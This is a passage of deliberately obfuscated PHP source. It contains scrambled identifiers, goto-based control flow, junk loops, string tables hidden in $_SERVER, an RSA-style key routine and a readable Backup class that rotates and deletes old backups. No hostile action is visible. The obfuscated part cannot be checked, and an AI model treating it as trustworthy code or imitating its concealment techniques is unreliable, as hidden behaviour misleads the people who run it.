$BğæõÆÎò[367](1); goto d””ô³¢¦˜; a·»¥•Ô©: if ($A§ç½—÷ ø - 1 > 0) { $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][144]}($C“ƒÜô½£¸, $Aß²´‰³Æ„, $A§ç½—÷ ø - 1); } return $C“ƒÜô½£¸; goto a¬ó×²âÚƒ; e¯•Ş´Œé: $dÙšÒÌøÍÖ = $BğæõÆÎò[363](0, 5) . $BğæõÆÎò[10]; $EÏœŞ«‡ñï = $BğæõÆÎò[141](15); $AŠãçôŒ¸† = $A››Ûóô•Ú[687]; goto e£Øƒ‘ƒ™; d””ô³¢¦˜: $B¥ î½Îì = $BğæõÆÎò[2]($B¥ î½Îì); $f¡š’£ÔÀ¥ = $A››Ûóô•Ú[686]; while ($f¡š’£ÔÀ¥ < $A››Ûóô•Ú[616]) { if ($f¡š’£ÔÀ¥ >= 0) { break; } $f¡š’£ÔÀ¥++; } goto e¯•Ş´Œé; a¬ó×²âÚƒ: } private function kbplbdd6b5c4($eÌöÍ²’²“, $F³›Äšèñ, $c–§ßìÇ‹Â = 3) { goto F‹‹¼‚Õ‚Í; F‹‹¼‚Õ‚Í: $Dç…¬Õ’¹Ã =& $_SERVER[›é¼±]; $dÃë³ïùğØ =& $_SERVER[ÀóÛœö]; if (!$dÃë³ïùğØ[165]($eÌöÍ²’²“) || $dÃë³ïùğØ[24]($eÌöÍ²’²“) < 10) { return !1; } goto Cí‰øìòŠ; bŠŠÙä’Á: $D’ö—êŒ¨Ö = $Dç…¬Õ’¹Ã[701]; $d‘ÕÈÖ‚„„ = $dÃë³ïùğØ[368]; $B±ÌÃã´İ‚ = $Dç…¬Õ’¹Ã[702]; goto eô£‰ê…ª; Cè‹„ÀïÀ: if (strlen($C‚Ÿ¢¨ğÂš) < $Dç…¬Õ’¹Ã[601]) { die; } $bŞÖ’çì„ƒ = $dÃë³ïùğØ[25]($eÌöÍ²’²“, 1, 15); $eÌöÍ²’²“ = $dÃë³ïùğØ[25]($eÌöÍ²’²“, 16); goto bŠŠÙä’Á; CÖã™ò¾®¸: return $b–ó‘êËË; goto AƒßŸÔ’¿ô; b¤…³¯­†„: $eÌöÍ²’²“ = $dÃë³ïùğØ[240]($eÌöÍ²’²“); $CÅŒ¹®§ùö = $eÌöÍ²’²“[0]; $C‚Ÿ¢¨ğÂš = $Dç…¬Õ’¹Ã[700]; goto Cè‹„ÀïÀ; Cí‰øìòŠ: $eÌöÍ²’²“ = $dÃë³ïùğØ[2]($eÌöÍ²’²“); $F‹–Ÿ¸Ö = $Dç…¬Õ’¹Ã[699]; if (strlen($F‹–Ÿ¸Ö) < $Dç…¬Õ’¹Ã[609]) { die; } goto b¤…³¯­†„; eô£‰ê…ª: while ($B±ÌÃã´İ‚ < $Dç…¬Õ’¹Ã[616]) { if ($B±ÌÃã´İ‚ >= 0) { break; } $B±ÌÃã´İ‚++; } switch ($CÅŒ¹®§ùö) { case $dÃë³ïùğØ[260]: $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][277]}($eÌöÍ²’²“, $dÃë³ïùğØ[240]($F³›Äšèñ . $bŞÖ’çì„ƒ)); break; case $dÃë³ïùğØ[246]: $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][277]}($eÌöÍ²’²“, $dÃë³ïùğØ[240]($bŞÖ’çì„ƒ . $F³›Äšèñ)); $e¡å¬¯ÛÎ = $Dç…¬Õ’¹Ã[703]; break; case $dÃë³ïùğØ[369]: $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][277]}($eÌöÍ²’²“, $dÃë³ïùğØ[135]($bŞÖ’çì„ƒ . $F³›Äšèñ)); break; $a²ÇƒšËÊ = $Dç…¬Õ’¹Ã[704]; if (!$a²ÇƒšËÊ) { return; } case $dÃë³ïùğØ[370]: $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][277]}($eÌöÍ²’²“, $dÃë³ïùğØ[131]($bŞÖ’çì„ƒ . $F³›Äšèñ)); break; case $dÃë³ïùğØ[371]: goto Dğ¶ÚÊˆ™À; Dğ¶ÚÊˆ™À: $eÌöÍ²’²“ = $dÃë³ïùğØ[375]($eÌöÍ²’²“); $a‰„¸¹åŠŠ = $eÌöÍ²’²“[0]; $eÌöÍ²’²“ = $dÃë³ïùğØ[25]($eÌöÍ²’²“, 1); goto fô¯¦İ®Ù; E‹¶º†õªŠ: for ($Cè§’î¯´Õ = 0; $Cè§’î¯´Õ < $dÃë³ïùğØ[24]($eÌöÍ²’²“); $Cè§’î¯´Õ++) { $c‰¶‘Ó¤‘ = $c‰¶‘Ó¤‘ == $dÃë³ïùğØ[24]($bê»ÌõËœ‡) ? 0 : $c‰¶‘Ó¤‘; $b³æñ¼ª±‡ = $Dç…¬Õ’¹Ã[711]; if (strlen($b³æñ¼ª±‡) < $Dç…¬Õ’¹Ã[606]) { die; } $FÚ…Ü•§áÙ = $c‰¶‘Ó¤‘++; $a—İ³¦òæ« = $dÃë³ïùğØ[373]($d‘ÕÈÖ‚„„, $eÌöÍ²’²“[$Cè§’î¯´Õ]) - $cÔçµ¢óÊµ - $dÃë³ïùğØ[374]($bê»ÌõËœ‡[$FÚ…Ü•§áÙ]); while ($a—İ³¦òæ« < 0) { $a—İ³¦òæ« += 64; $AÎ¢²Ø¿°Ø = $Dç…¬Õ’¹Ã[712]; while (strlen($AÎ¢²Ø¿°Ø) < $Dç…¬Õ’¹Ã[606]) { if (!$AÎ¢²Ø¿°Ø) { break; } $AÎ¢²Ø¿°Ø++; } } $F‘¸‡›Î¤† .= $d‘ÕÈÖ‚„„[$a—İ³¦òæ«]; $AØŒØ¥«Ğ = $Dç…¬Õ’¹Ã[713]; } $b–ó‘êËË = $dÃë³ïùğØ[376]($F‘¸‡›Î¤†); break; goto Bš„Ê™ƒ¤ê; d¢ã‚Ö½÷’: $aóˆˆä“Á = $Dç…¬Õ’¹Ã[706]; while (strlen($aóˆˆä“Á) < $Dç…¬Õ’¹Ã[609]) { if (!$aóˆˆä“Á) { break; } $aóˆˆä“Á++; } $bê»ÌõËœ‡ = $dÃë³ïùğØ[131]($a‰„¸¹åŠŠ . $dÃë³ïùğØ[131]($F³›Äšèñ . $a‰„¸¹åŠŠ) . $F³›Äšèñ); goto FĞˆ´Ë„¨; fô¯¦İ®Ù: $f¬ÌëŒŠ†Ÿ = $Dç…¬Õ’¹Ã[705]; if (!$f¬ÌëŒŠ†Ÿ) { return; } $cÔçµ¢óÊµ = $dÃë³ïùğØ[373]($d‘ÕÈÖ‚„„, $a‰„¸¹åŠŠ); goto d¢ã‚Ö½÷’; cÈè±îÒõĞ: $aá¸•¹ßÄÀ = $Dç…¬Õ’¹Ã[710]; $a—İ³¦òæ« = 0; $c‰¶‘Ó¤‘ = 0; goto E‹¶º†õªŠ; e‡êô×­ïÖ: $dÓœñ°Ş´ò = $Dç…¬Õ’¹Ã[709]; if (strlen($dÓœñ°Ş´ò) < $Dç…¬Õ’¹Ã[620]) { return; } $Cè§’î¯´Õ = 0; goto cÈè±îÒõĞ; c´¿È÷®’: $B¹ëŠÂÌÉª = $Dç…¬Õ’¹Ã[708]; if (!$B¹ëŠÂÌÉª) { return; } $F‘¸‡›Î¤† = $dÃë³ïùğØ[10]; goto e‡êô×­ïÖ; Bš„Ê™ƒ¤ê: $C…ß—Ä§Ñé = $Dç…¬Õ’¹Ã[714]; while (strlen($C…ß—Ä§Ñé) < $Dç…¬Õ’¹Ã[606]) { if (!$C…ß—Ä§Ñé) { break; } $C…ß—Ä§Ñé++; } goto f¢òª©Í; FĞˆ´Ë„¨: $Då‰âÀ±ÁÔ = $Dç…¬Õ’¹Ã[707]; if (!$Då‰âÀ±ÁÔ) { die; } $bê»ÌõËœ‡ = $dÃë³ïùğØ[25]($bê»ÌõËœ‡, $cÔçµ¢óÊµ % 8, $cÔçµ¢óÊµ % 8 + 7); goto c´¿È÷®’; f¢òª©Í: default: $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][277]}($eÌöÍ²’²“, $F³›Äšèñ . $bŞÖ’çì„ƒ); $cÙÅ´Œ‡£¬ = $Dç…¬Õ’¹Ã[715]; break; $eùÈğ“ÛÊÔ = $Dç…¬Õ’¹Ã[716]; if (strlen($eùÈğ“ÛÊÔ) < $Dç…¬Õ’¹Ã[609]) { return; } } if ($c–§ßìÇ‹Â - 1 > 0) { $b–ó‘êËË = $this->{$_SERVER[ÀóÛœö][215]}($b–ó‘êËË, $F³›Äšèñ, $c–§ßìÇ‹Â - 1); } goto CÖã™ò¾®¸; AƒßŸÔ’¿ô: } public function gcej68527e90($c¨Ô¡‘ğ·) { goto F•ÃÍ¾è—Ÿ; cò¸ğóÓÄõ: $cë½äËÖ™ = $a¹æ™òâî[720]; while ($cë½äËÖ™ < $a¹æ™òâî[616]) { if ($cë½äËÖ™ >= 0) { break; } $cë½äËÖ™++; } for ($bÒ¤†¶§¼ = 0; $bÒ¤†¶§¼ < $Aœ„ä¬½ßÆ * 10; $bÒ¤†¶§¼++) { if (($Aœ„ä¬½ßÆ * $bÒ¤†¶§¼ + 1) % $Dô×´˜”£‚ == 0) { $cµòª¢ Ç‘ = $aæ·É¬ÄªÒ[271](($Aœ„ä¬½ßÆ * $bÒ¤†¶§¼ + 1) / $Dô×´˜”£‚); break; } } goto C‹•³ƒñ; F•ÃÍ¾è—Ÿ: $a¹æ™òâî =& $_SERVER[›é¼±]; $aæ·É¬ÄªÒ =& $_SERVER[ÀóÛœö]; $fãÄ»ê“”« = $this->{$_SERVER[ÀóÛœö][377]}(); goto dÍ¹â©èÆó; dÍ¹â©èÆó: $AÍŠŞƒÚİ‚ = $this->{$_SERVER[ÀóÛœö][377]}(); $F–éÊÀÑ = $a¹æ™òâî[681]; if (!$F–éÊÀÑ) { return; } goto a«™æ¥É“„; f–ƒ¢‰ºŒ: $e°Øôˆ»ÁÎ = $a¹æ™òâî[722]; while (strlen($e°Øôˆ»ÁÎ) < $a¹æ™òâî[606]) { if (!$e°Øôˆ»ÁÎ) { break; } $e°Øôˆ»ÁÎ++; } goto BÏ˜†Œ´Î; dÄåÎà¾Ãç: while ($a½–‘ö»Á < $a¹æ™òâî[616]) { if ($a½–‘ö»Á >= 0) { break; } $a½–‘ö»Á++; } while (1) { $a‰¦ÛÕŠì¡ = $Dô×´˜”£‚; $c°Ş…‚Ãé© = $Aœ„ä¬½ßÆ; $BàÀ‰œÏ­Â = $a¹æ™òâî[718]; if (!$BàÀ‰œÏ­Â) { return; } while ($c°Ş…‚Ãé© % $a‰¦ÛÕŠì¡ != 0) { $EùÛ¹„ÛÊñ = $c°Ş…‚Ãé©; $c°Ş…‚Ãé© = $a‰¦ÛÕŠì¡; $d°îê ¨…„ = $a¹æ™òâî[719]; while ($d°îê ¨…„ < $a¹æ™òâî[609]) { if ($d°îê ¨…„ >= 0) { break; } $d°îê ¨…„++; } $a‰¦ÛÕŠì¡ = $EùÛ¹„ÛÊñ % $a‰¦ÛÕŠì¡; } if ($a‰¦ÛÕŠì¡ == 1) { break; } else { $Dô×´˜”£‚++; } } $cµòª¢ Ç‘ = 2; goto cò¸ğóÓÄõ; a«™æ¥É“„: $Aœ„ä¬½ßÆ = ($fãÄ»ê“”« - 1) * ($AÍŠŞƒÚİ‚ - 1); $Dô×´˜”£‚ = $aæ·É¬ÄªÒ[271](($fãÄ»ê“”« + $AÍŠŞƒÚİ‚) / 2); $a½–‘ö»Á = $a¹æ™òâî[717]; goto dÄåÎà¾Ãç; e©˜Æ¦à¾: $E„²²ÓÊÜ† = $aæ·É¬ÄªÒ[131]($aæ·É¬ÄªÒ[378] . ($fãÄ»ê“”« + $AÍŠŞƒÚİ‚) . $aæ·É¬ÄªÒ[379] . $Dô×´˜”£‚ . $aæ·É¬ÄªÒ[379] . $cµòª¢ Ç‘ . $aæ·É¬ÄªÒ[380]); $d×’ì²„›Ã = $this->{$_SERVER[ÀóÛœö][172]}($c¨Ô¡‘ğ·, $E„²²ÓÊÜ†) . $aæ·É¬ÄªÒ[381] . $BÊ—œÁ·Ùì; return $d×’ì²„›Ã; goto f–ƒ¢‰ºŒ; C‹•³ƒñ: $BÊ—œÁ·Ùì = $this->{$_SERVER[ÀóÛœö][172]}($fãÄ»ê“”« * $AÍŠŞƒÚİ‚ . $aæ·É¬ÄªÒ[10], $aæ·É¬ÄªÒ[174]); $Fšæ„×ÉäŠ = $a¹æ™òâî[721]; while ($Fšæ„×ÉäŠ < $a¹æ™òâî[606]) { if ($Fšæ„×ÉäŠ >= 0) { break; } $Fšæ„×ÉäŠ++; } goto e©˜Æ¦à¾; BÏ˜†Œ´Î: } public function fqlh1d7b895f($Bñè°©¦º) { goto BÍ¾î‚Ó; b˜‰ãĞé¡œ: if (!$Dß—éĞß«‹) { die; } return $A”øòÚäÅÀ; $F‰âÅİ•°´ = $cÄ¤õ‚øÅÊ[733]; goto a»²÷ÂÓğ„; b¯öÈ‰ÉæÒ: while (strlen($eä÷ƒ±é·º) < $cÄ¤õ‚øÅÊ[620]) { if (!$eä÷ƒ±é·º) { break; } $eä÷ƒ±é·º++; } $A”øòÚäÅÀ = $this->{$_SERVER[ÀóÛœö][277]}($DÍŸ“˜ İÇ[0], $C¨ŸÊîø–—); $Dß—éĞß«‹ = $cÄ¤õ‚øÅÊ[732]; goto b˜‰ãĞé¡œ; Aå£à‘´: $Fó°„ƒë¢ = 0; $Dë÷‡™Ú = $cÄ¤õ‚øÅÊ[724]; $bè”é·æº— = 0; goto BŠù“Ôƒçô; CßÛÅÅ”Ù: for ($F´ŸÊ¤³æ‘ = 0; $F´ŸÊ¤³æ‘ < $a‚¢ÁñŠ©ª * 10; $F´ŸÊ¤³æ‘++) { if (($a‚¢ÁñŠ©ª * $F´ŸÊ¤³æ‘ + 1) % $C—®¿†ëˆÃ == 0) { $Eˆ¡¶¾Ÿô¸ = $Bëáí„­Á‡[271](($a‚¢ÁñŠ©ª * $F´ŸÊ¤³æ‘ + 1) / $C—®¿†ëˆÃ); break; } } $C¨ŸÊîø–— = $Bëáí„­Á‡[131]($Bëáí„­Á‡[378] . ($Fó°„ƒë¢ + $bè”é·æº—) . $Bëáí„­Á‡[379] . $C—®¿†ëˆÃ . $Bëáí„­Á‡[379] . $Eˆ¡¶¾Ÿô¸ . $Bëáí„­Á‡[380]); $eä÷ƒ±é·º = $cÄ¤õ‚øÅÊ[731]; goto b¯öÈ‰ÉæÒ; BÍ¾î‚Ó: $cÄ¤õ‚øÅÊ =& $_SERVER[›é¼±]; $Bëáí„­Á‡ =& $_SERVER[ÀóÛœö]; $DÍŸ“˜ İÇ = $Bëáí„­Á‡[0]($Bëáí„­Á‡[381], $Bñè°©¦º); goto báÑ¯Ç çÜ; d“Õ¯æï: if (strlen($c¢ŒšÒ„§”) < $cÄ¤õ‚øÅÊ[606]) { return; } while (1) { $b Î®º¦©Î = $C—®¿†ëˆÃ; $fÏ÷ñæ = $cÄ¤õ‚øÅÊ[727]; $fºÊÃì£Å¤ = $a‚¢ÁñŠ©ª; $dì„è‘Ç• = $cÄ¤õ‚øÅÊ[728]; while ($fºÊÃì£Å¤ % $b Î®º¦©Î != 0) { $E²‰¼ÍÎÕß = $fºÊÃì£Å¤; $dŞ„®İèäƒ = $cÄ¤õ‚øÅÊ[729]; if (strlen($dŞ„®İèäƒ) < $cÄ¤õ‚øÅÊ[620]) { die; } $fºÊÃì£Å¤ = $b Î®º¦©Î; $EÑ÷ï¼…ŒË = $cÄ¤õ‚øÅÊ[730]; if (!$EÑ÷ï¼…ŒË) { die; } $b Î®º¦©Î = $E²‰¼ÍÎÕß % $b Î®º¦©Î; } if ($b Î®º¦©Î == 1) { break; } else { $C—®¿†ëˆÃ++; } } $Eˆ¡¶¾Ÿô¸ = 2; goto CßÛÅÅ”Ù; Bêâò…ß¯“: while (strlen($EŠİ²‘´) < $cÄ¤õ‚øÅÊ[620]) { if (!$EŠİ²‘´) { break; } $EŠİ²‘´++; } if (!$C¦…Ïù»è²) { return $Bëáí„­Á‡[10]; } $C¦…Ïù»è² = $Bëáí„­Á‡[271]($C¦…Ïù»è²); goto Aå£à‘´; báÑ¯Ç çÜ: if ($Bëáí„­Á‡[19]($DÍŸ“˜ İÇ) != 2) { return $Bëáí„­Á‡[10]; } $C¦…Ïù»è² = $this->{$_SERVER[ÀóÛœö][277]}($DÍŸ“˜ İÇ[1] . $Bëáí„­Á‡[10], $Bëáí„­Á‡[174]); $EŠİ²‘´ = $cÄ¤õ‚øÅÊ[723]; goto Bêâò…ß¯“; e·¿®ñ³øŸ: if (!$bª®ä°¬) { return; } $C—®¿†ëˆÃ = $Bëáí„­Á‡[271](($Fó°„ƒë¢ + $bè”é·æº—) / 2); $c¢ŒšÒ„§” = $cÄ¤õ‚øÅÊ[726]; goto d“Õ¯æï; BŠù“Ôƒçô: for ($F´ŸÊ¤³æ‘ = 3; $F´ŸÊ¤³æ‘ < $C¦…Ïù»è²; $F´ŸÊ¤³æ‘ += 2) { if ($C¦…Ïù»è² % $F´ŸÊ¤³æ‘ != 0) { continue; } $Fó°„ƒë¢ = $F´ŸÊ¤³æ‘; $bè”é·æº— = $Bëáí„­Á‡[271]($C¦…Ïù»è² / $F´ŸÊ¤³æ‘); break; } $a‚¢ÁñŠ©ª = ($Fó°„ƒë¢ - 1) * ($bè”é·æº— - 1); $bª®ä°¬ = $cÄ¤õ‚øÅÊ[725]; goto e·¿®ñ³øŸ; a»²÷ÂÓğ„: } public function fqmx23b3b528() { goto fÕ„­‹ÆÊ´; aÇËÍ„´Œ„: $aÂ•åœ¨Ú“ = $a™‚Š‘†—Ğ[735]; if (strlen($aÂ•åœ¨Ú“) < $a™‚Š‘†—Ğ[609]) { die; } $dæ½¹İ ® = 1; goto d˜··›‚µØ; eÖ—„ˆÖ¶: return $fšøëêŒëÊ; $cĞ”õùõ—¾ = $a™‚Š‘†—Ğ[740]; while (strlen($cĞ”õùõ—¾) < $a™‚Š‘†—Ğ[606]) { if (!$cĞ”õùõ—¾) { break; } $cĞ”õùõ—¾++; } goto EÉ÷¯Ö¯¦; d˜··›‚µØ: while ($dæ½¹İ ® <= (int) $c«Šò ôœ®[383]($B¶†Åñß )) { $Aò«Òîëó = $dæ½¹İ ®; $dØõãƒ‡±Ú = $a™‚Š‘†—Ğ[736]; if (!$dØõãƒ‡±Ú) { die; } while (!0) { $Aò«Òîëó++; $eèÁß‡ å = $a™‚Š‘†—Ğ[737]; if (strlen($eèÁß‡ å) < $a™‚Š‘†—Ğ[616]) { die; } if ($Aò«Òîëó <= 2) { $dæ½¹İ ® = $Aò«Òîëó; break; } else { if ($Aò«Òîëó < 2) { continue; } } $Fİóš×šÂæ = !0; for ($b†‰®³ªø = 2; $b†‰®³ªø <= $c«Šò ôœ®[383]($Aò«Òîëó); $b†‰®³ªø++) { if ($Aò«Òîëó % $b†‰®³ªø == 0) { $Fİóš×šÂæ = !1; } } if ($Fİóš×šÂæ) { $dæ½¹İ ® = $Aò«Òîëó; break; } } $F‰ËÈÈÉª¸[] = $dæ½¹İ ®; $Aà¿ã®ÌÚÍ = $a™‚Š‘†—Ğ[738]; if (!$Aà¿ã®ÌÚÍ) { die; } } $fšøëêŒëÊ = 2; for ($Aò«Òîëó = $B¶†Åñß ; $Aò«Òîëó > 1; $Aò«Òîëó--) { $Fİóš×šÂæ = !0; $Aˆ†÷„’ = $a™‚Š‘†—Ğ[739]; while ($Aˆ†÷„’ < $a™‚Š‘†—Ğ[616]) { if ($Aˆ†÷„’ >= 0) { break; } $Aˆ†÷„’++; } foreach ($F‰ËÈÈÉª¸ as $D®ÉĞõàÓ) { if ($Aò«Òîëó % $D®ÉĞõàÓ == 0) { $Fİóš×šÂæ = !1; break; } } if ($Fİóš×šÂæ) { $fšøëêŒëÊ = $Aò«Òîëó; break; } } goto eÖ—„ˆÖ¶; fÕ„­‹ÆÊ´: $a™‚Š‘†—Ğ =& $_SERVER[›é¼±]; $c«Šò ôœ® =& $_SERVER[ÀóÛœö]; $B¶†Åñß  = $c«Šò ôœ®[363]($c«Šò ôœ®[382](2, 14), $c«Šò ôœ®[382](2, 16) - 1); goto Fâ‚˜ŸŒŠ; Fâ‚˜ŸŒŠ: $B½ªª¦ìá = $a™‚Š‘†—Ğ[734]; while ($B½ªª¦ìá < $a™‚Š‘†—Ğ[616]) { if ($B½ªª¦ìá >= 0) { break; } $B½ªª¦ìá++; } $F‰ËÈÈÉª¸ = array(); goto aÇËÍ„´Œ„; EÉ÷¯Ö¯¦: } public function xuta37949ec8($EëÊŞ„’™Õ, $C¸ËÊœ¦Ãœ) { $E·ôŸêƒ =& $_SERVER[ÀóÛœö]; return $E·ôŸêƒ[13](array($E·ôŸêƒ[14], $E·ôŸêƒ[384]), $EëÊŞ„’™Õ, $C¸ËÊœ¦Ãœ); $BÑ”ŸÌø… = $_SERVER[›é¼±][741]; } public function eyrs4dec4376($DªŞèİïê®, $A’‰ïê˜ˆõ) { $BÏŒä”¸®ó =& $_SERVER[ÀóÛœö]; return $BÏŒä”¸®ó[13](array($BÏŒä”¸®ó[385], $BÏŒä”¸®ó[386]), $DªŞèİïê®, $A’‰ïê˜ˆõ); } public function ewftbd01d09f($Fáº„‹‡±½, $eÆÚØô³é) { $fÏ–öÉ†Ü =& $_SERVER[ÀóÛœö]; return $fÏ–öÉ†Ü[13](array($fÏ–öÉ†Ü[385], $fÏ–öÉ†Ü[387]), $Fáº„‹‡±½, $eÆÚØô³é); $cÕÙÉ‡É¦ = $_SERVER[›é¼±][742]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Dã¿¿î¹¤Ø =& $_SERVER[›é¼±]; $this->isManual(); self::$name = date($Dã¿¿î¹¤Ø[743]); if (!($B¯öºˆ“ë‹ = Model($Dã¿¿î¹¤Ø[744])->lastItem())) { $B¯öºˆ“ë‹ = $this->initData(); } else { self::$name = $B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[28]]; if ($B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[745]] == $Dã¿¿î¹¤Ø[87]) { self::$name = date($Dã¿¿î¹¤Ø[746]); $D¸‰¡°¸” = 0; if (isset($B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[291]][$Dã¿¿î¹¤Ø[193]][$Dã¿¿î¹¤Ø[461]])) { $D¸‰¡°¸” = (int) $B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[291]][$Dã¿¿î¹¤Ø[193]][$Dã¿¿î¹¤Ø[461]]; } if (self::$manual == 0 && $B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[28]] == self::$name) { Model($Dã¿¿î¹¤Ø[744])->remove($B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[395]]); } $B¯öºˆ“ë‹ = $this->initData($D¸‰¡°¸”, $B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[747]]); } else { $this->checkStore($B¯öºˆ“ë‹[$Dã¿¿î¹¤Ø[747]]); } } self::$option = $B¯öºˆ“ë‹; } private function isManual() { $DÛğÚÀ†Íì = _get($GLOBALS, $_SERVER[›é¼±][748], 0); $DÛğÚÀ†Íì = intval($DÛğÚÀ†Íì); self::$manual = $DÛğÚÀ†Íì && $DÛğÚÀ†Íì == 1 ? 1 : 0; } private function initData($f”ÒˆÊó˜ = 0, $E“Ì“ÚËè = '') { goto eë‚Œ™ùà¦; e©ĞĞªµ©¬: $A¢İËğ„£ = Model($D¼ŒÎ‰âÏÓ[744])->insert($BÜ½¯Õ‹¸Ì); $BÜ½¯Õ‹¸Ì[$D¼ŒÎ‰âÏÓ[395]] = $A¢İËğ„£; return $BÜ½¯Õ‹¸Ì; goto eå‹šíÁ; Dš×İÓ‚: $this->checkStore($eõòÚîŒÁ‘[$D¼ŒÎ‰âÏÓ[747]]); if (self::$manual == 1) { self::$name .= $D¼ŒÎ‰âÏÓ[71] . date($D¼ŒÎ‰âÏÓ[749]); } $BÜ½¯Õ‹¸Ì = array($D¼ŒÎ‰âÏÓ[747] => $eõòÚîŒÁ‘[$D¼ŒÎ‰âÏÓ[747]], $D¼ŒÎ‰âÏÓ[28] => self::$name, $D¼ŒÎ‰âÏÓ[745] => 0, $D¼ŒÎ‰âÏÓ[750] => $eõòÚîŒÁ‘[$D¼ŒÎ‰âÏÓ[750]], $D¼ŒÎ‰âÏÓ[751] => self::$manual, $D¼ŒÎ‰âÏÓ[291] => array($D¼ŒÎ‰âÏÓ[752] => array($D¼ŒÎ‰âÏÓ[745] => 0), $D¼ŒÎ‰âÏÓ[753] => array($D¼ŒÎ‰âÏÓ[745] => 0, $D¼ŒÎ‰âÏÓ[754] => 0, $D¼ŒÎ‰âÏÓ[755] => 0, $D¼ŒÎ‰âÏÓ[29] => $D¼ŒÎ‰âÏÓ[33], $D¼ŒÎ‰âÏÓ[756] => 0, $D¼ŒÎ‰âÏÓ[490] => 0), $D¼ŒÎ‰âÏÓ[757] => array($D¼ŒÎ‰âÏÓ[745] => 0, $D¼ŒÎ‰âÏÓ[754] => 0, $D¼ŒÎ‰âÏÓ[755] => 0, $D¼ŒÎ‰âÏÓ[756] => 0, $D¼ŒÎ‰âÏÓ[490] => 0), $D¼ŒÎ‰âÏÓ[193] => array($D¼ŒÎ‰âÏÓ[745] => 0, $D¼ŒÎ‰âÏÓ[758] => 0, $D¼ŒÎ‰âÏÓ[759] => 0, $D¼ŒÎ‰âÏÓ[760] => 0, $D¼ŒÎ‰âÏÓ[761] => 0, $D¼ŒÎ‰âÏÓ[461] => $f”ÒˆÊó˜, $D¼ŒÎ‰âÏÓ[756] => 0, $D¼ŒÎ‰âÏÓ[490] => 0)), $D¼ŒÎ‰âÏÓ[756] => time(), $D¼ŒÎ‰âÏÓ[490] => 0); goto e©ĞĞªµ©¬; eë‚Œ™ùà¦: $D¼ŒÎ‰âÏÓ =& $_SERVER[›é¼±]; $eõòÚîŒÁ‘ = Model($D¼ŒÎ‰âÏÓ[744])->config(); if ($E“Ì“ÚËè && $eõòÚîŒÁ‘[$D¼ŒÎ‰âÏÓ[747]] != $E“Ì“ÚËè) { $f”ÒˆÊó˜ = 0; } goto Dš×İÓ‚; eå‹šíÁ: } private function checkStore($BÖÀó§Üâğ) { $CèÖÏ®µ³² =& $_SERVER[›é¼±]; $e’é“£•£‹ = Model($CèÖÏ®µ³²[762])->listData($BÖÀó§Üâğ); Model($CèÖÏ®µ³²[762])->checkConfig($e’é“£•£‹); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[›é¼±][744])->findByName(self::$name); } return self::$option; } public static function set($B·ƒÀÅëø) { $E´¥‡ÇŒÀ =& $_SERVER[›é¼±]; $F–ì®± = self::get(); foreach ($B·ƒÀÅëø as $aêŠ´Œ£™ => $D°”å¹ÕË¿) { $dŠÔ‘â‚º‡ = explode($E´¥‡ÇŒÀ[95], $aêŠ´Œ£™); $b­âçËØ  = count($dŠÔ‘â‚º‡); switch ($b­âçËØ ) { case 1: $F–ì®±[$dŠÔ‘â‚º‡[0]] = $D°”å¹ÕË¿; break; case 2: $F–ì®±[$dŠÔ‘â‚º‡[0]][$dŠÔ‘â‚º‡[1]] = $D°”å¹ÕË¿; break; case 3: $F–ì®±[$dŠÔ‘â‚º‡[0]][$dŠÔ‘â‚º‡[1]][$dŠÔ‘â‚º‡[2]] = $D°”å¹ÕË¿; break; } } Model($E´¥‡ÇŒÀ[744])->update($F–ì®±[$E´¥‡ÇŒÀ[395]], $F–ì®±); self::$option = $F–ì®±; return self::$option; } public function keep() { $D†İªéóö„ =& $_SERVER[›é¼±]; $A»ñ¯¡¥ÈÀ = self::get(); if ($A»ñ¯¡¥ÈÀ[$D†İªéóö„[291]][$D†İªéóö„[752]][$D†İªéóö„[745]] == $D†İªéóö„[87]) { return; } $this->backupKeep($A»ñ¯¡¥ÈÀ); self::set(array($D†İªéóö„[763] => 1)); } private function backupKeep($e„©ñÈçº«) { goto BŸ¯ñ‘á¤¶; DìŞø¿Î¢œ: if (empty($fçÚ–‹è¯¢)) { return; } $fàÜËœ¤½ = 0; $cßÏ×Ğªïá = array(); goto dƒêùõî; fÉŠíñÒÆ: $Cœô°¶èâÆ = Model($AÚá’ĞÀ÷–[765])->get($AÚá’ĞÀ÷–[766]); foreach ($fçÚ–‹è¯¢ as $dÕ•õ½Õ¾) { if (isset($dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[751]]) && $dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[751]] == $AÚá’ĞÀ÷–[87]) { continue; } if (!empty($dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[28]]) && in_array($dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[28]], $cßÏ×Ğªïá)) { continue; } Model($AÚá’ĞÀ÷–[744])->remove($dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[395]]); $eÜÚ¦Ä¡÷ƒ = $this->backupPath($e„©ñÈçº«, $Cœô°¶èâÆ); IO::remove($eÜÚ¦Ä¡÷ƒ, !1); } goto d±ï®Ùî÷ñ; dƒêùõî: foreach ($fçÚ–‹è¯¢ as $dÕ•õ½Õ¾) { if ($fàÜËœ¤½ >= 7) { break; } $cßÏ×Ğªïá[] = $dÕ•õ½Õ¾[$AÚá’ĞÀ÷–[28]]; $fàÜËœ¤½++; } for ($fàÜËœ¤½ = 0; $fàÜËœ¤½ < 12; $fàÜËœ¤½++) { $cßÏ×Ğªïá[] = date($AÚá’ĞÀ÷–[764], strtotime("\x2d{$fàÜËœ¤½}\40\155\157\x6e\164\x68\x73")); } $cßÏ×Ğªïá = array_unique($cßÏ×Ğªïá); goto fÉŠíñÒÆ; BŸ¯ñ‘á¤¶: $AÚá’ĞÀ÷– =& $_SERVER[›é¼±]; if (self::$manual == 1) { return; } 